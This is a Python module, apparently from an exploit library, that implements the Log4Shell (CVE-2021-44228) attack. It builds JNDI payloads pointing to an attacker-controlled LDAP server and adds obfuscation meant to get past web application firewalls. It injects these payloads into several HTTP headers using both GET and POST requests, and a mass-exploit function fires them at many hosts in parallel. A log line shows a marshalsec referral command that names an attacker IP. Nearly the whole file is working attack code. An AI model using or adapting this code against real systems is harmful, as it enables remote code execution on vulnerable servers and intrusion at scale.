# File: modules/exploit_lib/cve_2021_44228_log4j.py

"""
Log4Shell (CVE-2021-44228) PoC:
• Builds a JNDI payload that points to an attacker LDAP server hosting a malicious Java class.
• Sends HTTP requests with the payload in common headers.
• Listens for LDAP callback or spawns a reverse shell.
"""

import logging
import socket
import threading
import http.server
import sys
from urllib.parse import quote
from bismillah import log_event

logger = logging.getLogger("cve_2021_44228")

LDAP_HOST = "attacker.ldap.server"     # Change to your LDAP server
LDAP_PORT = 1389
HTTP_PORT = 8000

# Minimal Java class to spawn reverse shell or download a payload
JAVA_CLASS = """
package evil;
import java.io.IOException;
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "calc.exe"});
        } catch (IOException e) {}
    }
}
"""

def start_ldap_server(base_dn="dc=example,dc=com", java_class: str = None, listen_ip: str = "0.0.0.0", port: int = LDAP_PORT):
    """
    Enhanced: 
    - Logs instructions for running a real LDAP server (marshalsec, rogue-jndi, etc).
    - Optionally starts a dummy TCP listener for demonstration.
    """
    logger.info(f"[Log4Shell] Start a malicious LDAP server on {listen_ip}:{port} serving Exploit class")
    logger.info("[Log4Shell] Example: java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer 'http://<attacker_ip>:8000/#Exploit'")
    # Optionally, start a dummy TCP listener (does not serve real LDAP)
    import threading, socket
    def dummy_ldap():
        s = socket.socket()
        s.bind((listen_ip, port))
        s.listen(1)
        logger.info(f"[Log4Shell] Dummy LDAP listener started on {listen_ip}:{port}")
        while True:
            conn, addr = s.accept()
            logger.info(f"[Log4Shell] LDAP connection from {addr}")
            conn.close()
    t = threading.Thread(target=dummy_ldap, daemon=True)
    t.start()

def build_payload(jndi_url: str, obfuscate: bool = False) -> str:
    """
    Creates the JNDI lookup string for headers.
    If obfuscate=True, uses unicode tricks to bypass some WAFs.
    """
    payload = f"${{jndi:{jndi_url}}}"
    if obfuscate:
        # Example obfuscation: ${${::-j}${::-n}${::-d}${::-i}:ldap://...}
        proto = "ldap"
        obf = "${" + "}${".join([f"::-{c}" for c in "jndi"]) + "}"
        payload = f"${{{obf}:{proto}://{jndi_url.split('://',1)[1]}}}"
    return payload

def exploit(target: str, port: int = 80, path: str = "/", headers: dict = None, payloads: list = None, spray: int = 1, delay: float = 0.0, obfuscate: bool = False) -> dict:
    """
    Enhanced Log4Shell exploit:
    - Supports spraying multiple payloads, obfuscation, and delay between requests.
    - Returns all HTTP responses and status codes.
    - Now supports multi-header injection, custom HTTP methods, and post-ex callback.
    """
    import requests
    import time as _time
    results = []
    jndi_url = f"ldap://{LDAP_HOST}:{LDAP_PORT}/evilClass"
    payload_list = payloads if payloads else [build_payload(jndi_url, obfuscate=obfuscate)]
    # Dangerous: inject into multiple headers for each payload
    injection_headers = ["User-Agent", "Referer", "X-Api-Version", "X-Forwarded-For", "X-Requested-With"]
    http_methods = ["GET", "POST"]  # Try both GET and POST for each payload
    for i in range(spray):
        for payload in payload_list:
            for method in http_methods:
                for inj_header in injection_headers:
                    send_headers = headers.copy() if headers else {}
                    for h in injection_headers:
                        send_headers[h] = payload
                    url = f"http://{target}:{port}{path}"
                    try:
                        logger.info(f"[Log4Shell] Sending {method} exploit to {url} with {inj_header}={payload}")
                        if method == "GET":
                            resp = requests.get(url, headers=send_headers, timeout=10)
                        else:
                            resp = requests.post(url, headers=send_headers, data="test=1", timeout=10)
                        log_event("cve_2021_44228", f"Sent {method} payload to {url}, status {resp.status_code}".encode())
                        results.append({
                            "status": "ok",
                            "http_status": resp.status_code,
                            "payload": payload,
                            "header": inj_header,
                            "method": method
                        })
                    except Exception as e:
                        logger.error(f"[Log4Shell] Exploit failed: {e}")
                        results.append({
                            "status": "error",
                            "detail": str(e),
                            "payload": payload,
                            "header": inj_header,
                            "method": method
                        })
                    if delay > 0:
                        _time.sleep(delay)
    if len(results) == 1:
        return results[0]
    return {"status": "multi", "results": results}

def mass_exploit(targets, **kwargs):
    """
    Dangerous: Mass exploit multiple targets in parallel.
    - targets: list of IPs/hostnames.
    - kwargs: passed to exploit().
    - Returns dict of results.
    """
    import threading
    results = {}
    lock = threading.Lock()
    def worker(tgt):
        try:
            res = exploit(tgt, **kwargs)
            with lock:
                results[tgt] = res
        except Exception as e:
            logger.error(f"mass_exploit error for {tgt}: {e}")
    threads = []
    for tgt in targets:
        t = threading.Thread(target=worker, args=(tgt,), daemon=True)
        threads.append(t)
        t.start()
    for t in threads:
        t.join(timeout=15)
    return results
